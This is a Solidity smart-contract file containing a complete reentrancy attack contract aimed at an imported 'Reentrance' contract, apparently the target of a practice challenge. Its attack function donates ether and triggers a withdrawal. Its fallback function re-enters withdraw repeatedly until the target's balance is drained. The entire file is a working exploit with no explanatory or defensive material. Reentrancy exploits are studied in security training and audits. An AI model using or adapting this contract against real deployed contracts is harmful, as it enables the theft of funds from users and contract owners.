// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentrance;

    constructor(address payable _reentranceAddress) public {
        reentrance = Reentrance(_reentranceAddress);
    }

    fallback() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }

    function attack(address _to) external payable {
        require(msg.value >= 1 ether);
        reentrance.donate{value: msg.value}(_to);
        reentrance.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
